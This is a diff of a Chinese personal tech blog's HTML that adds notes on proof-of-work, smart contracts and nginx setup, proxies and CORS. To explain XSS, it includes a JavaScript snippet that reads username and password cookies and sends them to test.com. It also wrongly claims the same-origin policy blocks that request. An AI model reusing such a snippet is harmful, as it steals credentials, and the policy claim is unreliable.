@@ -177,6 +177,86 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/31/%E8%AE%A1%E7%AE%97%E6%9C%BA-block-chain/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="FreeJim">
+      <meta itemprop="description" content="Hello World">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏经阁">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/31/%E8%AE%A1%E7%AE%97%E6%9C%BA-block-chain/" class="post-title-link" itemprop="url">计算机-block-chain</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-05-31 17:14:53" itemprop="dateCreated datePublished" datetime="2022-05-31T17:14:53+08:00">2022-05-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-27 15:43:00" itemprop="dateModified" datetime="2022-06-27T15:43:00+08:00">2022-06-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="POW"><a href="#POW" class="headerlink" title="POW"></a>POW</h1><p>Proof of work</p>
+<p>工作量证明</p>
+<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220531171607351.png" alt="image-20220531171607351"></p>
+<p>首先，工作量就是那一串字符串—— Hash(previous hash + timestamp + nounce + root)</p>
+<p>枚举没意义的，只能不停地通过改变nonce去Hash</p>
+<p>（0的个数是difficulty，需要的0越多，mining越难）</p>
+<p>当你计算Hash出了一串前n位为0的字符串时，把你的构造参数告诉其他人</p>
+<p>然后其他人验证之后，发现这个串真的被你Hash出来了，承认了你</p>
+<p>（这里的其他人可以是区块链的用户，他们其实更喜欢你早点把矿挖出来，因为他们的钱就更快到账了）</p>
+<p>然后你就可以得到报酬了~</p>
+<h1 id="Smart-Contracts"><a href="#Smart-Contracts" class="headerlink" title="Smart Contracts"></a>Smart Contracts</h1><p>智能合约</p>
+<p>代码写在区块链上</p>
+<p>自动执行</p>
+<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220531173233523.png" alt="image-20220531173233523"></p>
+<p>must pay back the loan before the transaction ends</p>
+<p>otherwise the smart contract reverses the transaction</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/20/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%B8%B8%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -740,7 +820,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-21 18:28:24" itemprop="dateModified" datetime="2022-06-21T18:28:24+08:00">2022-06-21</time>
+                <time title="Modified: 2023-02-01 14:26:48" itemprop="dateModified" datetime="2023-02-01T14:26:48+08:00">2023-02-01</time>
               </span>
 
           
@@ -754,12 +834,75 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>nginx.conf 位置：<code>/etc/nginx/</code></p>
+          <h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04">https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04</a></p>
+<p>请求转发、反向代理、负载均衡</p>
+<h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s (signal)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx -s quit</span><br><span class="line">nginx -s stop</span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="简单的图片服务器"><a href="#简单的图片服务器" class="headerlink" title="简单的图片服务器"></a>简单的图片服务器</h2><p>默认资源文件夹：<code>/var/www/html</code></p>
+<p>可自定义</p>
+<p>看下面的server</p>
+<p>在http模块下配置一个server即可</p>
+<p>nginx.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">	# multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Basic Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	tcp_nodelay on;</span><br><span class="line">	keepalive_timeout 65;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line">	# server_tokens off;</span><br><span class="line"></span><br><span class="line">	# server_names_hash_bucket_size 64;</span><br><span class="line">	# server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# SSL Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">	ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Logging Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	access_log /var/log/nginx/access.log;</span><br><span class="line">	error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Gzip Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	# gzip_vary on;</span><br><span class="line">	# gzip_proxied any;</span><br><span class="line">	# gzip_comp_level 6;</span><br><span class="line">	# gzip_buffers 16 8k;</span><br><span class="line">	# gzip_http_version 1.1;</span><br><span class="line">	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Virtual Host Configs</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line">	include /etc/nginx/sites-enabled/*;</span><br><span class="line">	server&#123;</span><br><span class="line">		listen 80;</span><br><span class="line">		server_name localhost;</span><br><span class="line">		location  ~ .*\.(gif|jpg|jpeg|png)$ &#123;</span><br><span class="line">			root /home/cola/Downloads/;</span><br><span class="line">		&#125;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mail &#123;</span><br><span class="line">#	# See sample authentication script at:</span><br><span class="line">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="line"># </span><br><span class="line">#	# auth_http localhost/auth.php;</span><br><span class="line">#	# pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="line">#	# imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="line"># </span><br><span class="line">#	server &#123;</span><br><span class="line">#		listen     localhost:110;</span><br><span class="line">#		protocol   pop3;</span><br><span class="line">#		proxy      on;</span><br><span class="line">#	&#125;</span><br><span class="line"># </span><br><span class="line">#	server &#123;</span><br><span class="line">#		listen     localhost:143;</span><br><span class="line">#		protocol   imap;</span><br><span class="line">#		proxy      on;</span><br><span class="line">#	&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p><code>客户端client</code>与<code>代理服务器proxy</code>处于同一个局域网，就是正向代理<br><code>服务器server</code>与<code>代理服务器proxy</code>处于同一局域网，就是反向代理</p>
+<ul>
+<li>正向代理是代理客户端</li>
+<li>反向代理是代理服务器</li>
+</ul>
+<ul>
+<li><p>正向代理隐藏真实客户端</p>
+</li>
+<li><p>反向代理隐藏真实服务端</p>
+</li>
+</ul>
+<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>为什么会有跨域问题</p>
+<p>首先，跨域说白了就是访问其他域名（区别于当前域名）的资源</p>
+<p>那为什么不允许呢？</p>
+<p>是因为浏览器为了保证安全而设置的同源策略/SOP（Same origin policy）</p>
+<p>如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击</p>
+<p>举个例子：</p>
+<p>假定有一个交流论坛</p>
+<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20230201094007070.png" alt="image-20230201094007070"></p>
+<p>有用户在评价里写了恶意代码</p>
+<p>那么，在其他用户浏览评论的时候就完蛋了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username=CookieHelper.getCookie(<span class="string">&#x27;username&#x27;</span>).value;</span><br><span class="line"><span class="keyword">var</span> password=CookieHelper.getCookie(<span class="string">&#x27;password&#x27;</span>).value;</span><br><span class="line"><span class="keyword">var</span> script =<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.src=<span class="string">&#x27;http://test.com/index.php?username=&#x27;</span>+username+<span class="string">&#x27;&amp;password=&#x27;</span>+password;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure>
+
+<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://test.com/index.php">http://test.com/index.php</a></p>
+<p>发送了一个get请求</p>
+<p>如果有了同源策略的话，这个请求就发不出去</p>
+<p>防止了密码的泄露</p>
+<h2 id="Vue的跨域问题"><a href="#Vue的跨域问题" class="headerlink" title="Vue的跨域问题"></a>Vue的跨域问题</h2><p>本地环境下</p>
+<p><img src="C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201141025695.png" alt="image-20230201141025695"></p>
+<p>有些时候可能vue还在本地跑，但是Server是已经部署到公网了</p>
+<p>这个时候访问网页就报跨域的问题了</p>
+<p>因为browser有同源的限制</p>
+<p><img src="C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201142415976.png" alt="image-20230201142415976"></p>
+<p>那么解决跨域问题就需要代理服务器了</p>
+<p>Ps：proxy服务器没有浏览器同源的限制</p>
+<p><img src="C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201142609679.png" alt="image-20230201142609679"></p>
+<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p><img src="C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230131154755265.png" alt="image-20230131154755265"></p>
+<p>nginx.conf 位置：<code>/etc/nginx/</code></p>
 <p>日志位置：<code>/var/log/nginx/</code></p>
+<p>资源文件夹：<code>/var/www/html</code></p>
 <p>简单部署就安装了简易版的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-
-
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx-light</span><br></pre></td></tr></table></figure>
 
@@ -782,7 +925,13 @@
 
 
 <p>卸载nginx</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove nginx nginx-common</span><br><span class="line">sudo apt-get purge nginx nginx-common</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">sudo apt-get remove nginx-full nginx-common</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove nginx nginx-common</span><br><span class="line">sudo apt-get purge nginx nginx-common</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">sudo apt-get remove nginx-full nginx-common</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
 
 
       
@@ -849,180 +998,6 @@
 
       
           <h1 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h1><p>would not talk</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/22/%E6%B1%87%E7%BC%96-Java%E6%B8%B8%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="FreeJim">
-      <meta itemprop="description" content="Hello World">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏经阁">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/22/%E6%B1%87%E7%BC%96-Java%E6%B8%B8%E8%AE%B0/" class="post-title-link" itemprop="url">汇编-Java游记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-04-22 22:40:17" itemprop="dateCreated datePublished" datetime="2022-04-22T22:40:17+08:00">2022-04-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-27 15:46:17" itemprop="dateModified" datetime="2022-06-27T15:46:17+08:00">2022-06-27</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="词汇"><a href="#词汇" class="headerlink" title="词汇"></a>词汇</h1><p>ASCII =&gt; a:ski</p>
-<p>C Language</p>
-<p>Java =&gt; 家va:</p>
-<p>Circuit =&gt; /‘sɜːkɪt/</p>
-<p>A minus B</p>
-<p>negative B =&gt; 负B</p>
-<p>queue =&gt; /kjuː/</p>
-<p>formula =&gt; 公式</p>
-<p>module =&gt; /‘mɒdjuːl/ 不是抖！！！</p>
-<p>token =&gt; /‘təʊk(ə)n/ 偷</p>
-<p>UID =&gt; unique ID</p>
-<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="单复数问题"><a href="#单复数问题" class="headerlink" title="单复数问题"></a>单复数问题</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214228557.png" alt="image-20220427214228557"></p>
-<p>有些确实可能是为0的</p>
-<p>你加s就不合适了</p>
-<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p><img src="C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20220505230553515.png" alt="image-20220505230553515"></p>
-<p>static final常量是好的，HotSpot VM里的JIT编译器会利用这个信息来做优化；</p>
-<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220615173113696.png" alt="image-20220615173113696"></p>
-<h1 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h1><h2 id="路径参数"><a href="#路径参数" class="headerlink" title="路径参数"></a>路径参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/&#123;id&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult&lt;OmsOrderSetting&gt; <span class="title">getItem</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><h2 id="操作日志实现"><a href="#操作日志实现" class="headerlink" title="操作日志实现"></a>操作日志实现</h2><p>基于AOP</p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1655923">参考文档</a></p>
-<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220422224710414.png" alt="image-20220422224710414"></p>
-<h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213017958.png" alt="image-20220427213017958"></p>
-<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213045844.png" alt="image-20220427213045844"></p>
-<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213106407.png" alt="image-20220427213106407"></p>
-<h1 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h1><p>写了单元测试之后，你就不用一个个接口去测了:)</p>
-<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213246557.png" alt="image-20220427213246557"></p>
-<p>例子：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.dev33.satoken.stp.StpUtil;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.lpcs.modules.user.controller.AccountManageController;</span><br><span class="line"><span class="keyword">import</span> com.lpcs.modules.user.entity.account.manage.AddSubAccountReq;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.request.MockMvcRequestBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.result.MockMvcResultMatchers;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.setup.MockMvcBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lpcs.LpcsApplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = LpcsApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountManageTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    AccountManageController accountManageController;</span><br><span class="line"></span><br><span class="line">    MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    String mainToken;</span><br><span class="line"></span><br><span class="line">    String adminToken;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mockMvc = MockMvcBuilders.standaloneSetup(accountManageController).build();</span><br><span class="line">        mainToken = buildMainToken();</span><br><span class="line">        adminToken = buildAdminToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">buildMainToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StpUtil.login(<span class="number">6427</span>);</span><br><span class="line">        <span class="keyword">return</span> StpUtil.getTokenValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">buildAdminToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StpUtil.login(<span class="number">6431</span>);</span><br><span class="line">        <span class="keyword">return</span> StpUtil.getTokenValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addSubAccount</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        setup();</span><br><span class="line">        String param = buildAddSubAccountParams();</span><br><span class="line">        HttpHeaders headers = buildAddSubAccountHeaders();</span><br><span class="line">        mockMvc.perform(</span><br><span class="line">                MockMvcRequestBuilders.</span><br><span class="line">                        get(<span class="string">&quot;/account/manage/add/sub/account&quot;</span>).</span><br><span class="line">                        content(param).</span><br><span class="line">                        headers(headers)).</span><br><span class="line">                        andExpect(MockMvcResultMatchers.status().isOk());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> HttpHeaders <span class="title">buildAddSubAccountHeaders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HttpHeaders headers = <span class="keyword">new</span> HttpHeaders();</span><br><span class="line">        headers.add(<span class="string">&quot;lpcs_token&quot;</span>, mainToken);</span><br><span class="line">        headers.add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">buildAddSubAccountParams</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        AddSubAccountReq req = <span class="keyword">new</span> AddSubAccountReq();</span><br><span class="line">        List&lt;Integer&gt; permissions = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        permissions.add(<span class="number">5</span>);</span><br><span class="line">        permissions.add(<span class="number">6</span>);</span><br><span class="line">        req.setPassword(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        req.setDepartmentId(<span class="number">2</span>);</span><br><span class="line">        req.setRealName(<span class="string">&quot;小红&quot;</span>);</span><br><span class="line">        req.setLabel(<span class="string">&quot;保安2&quot;</span>);</span><br><span class="line">        req.setPermissions(permissions);</span><br><span class="line">        String json = JSON.toJSONString(req);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="用户考虑"><a href="#用户考虑" class="headerlink" title="用户考虑"></a>用户考虑</h1><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213354984.png" alt="image-20220427213354984"></p>
-<h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213427122.png" alt="image-20220427213427122"></p>
-<p>所以，这就是为什么不准用特殊字符的原因！！！</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/czfan/p/15039504.html">参考</a></p>
-<h2 id="用户传过来的参数大小"><a href="#用户传过来的参数大小" class="headerlink" title="用户传过来的参数大小"></a>用户传过来的参数大小</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427213912815.png" alt="image-20220427213912815"></p>
-<h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="用作标记"><a href="#用作标记" class="headerlink" title="用作标记"></a>用作标记</h2><p>AOP</p>
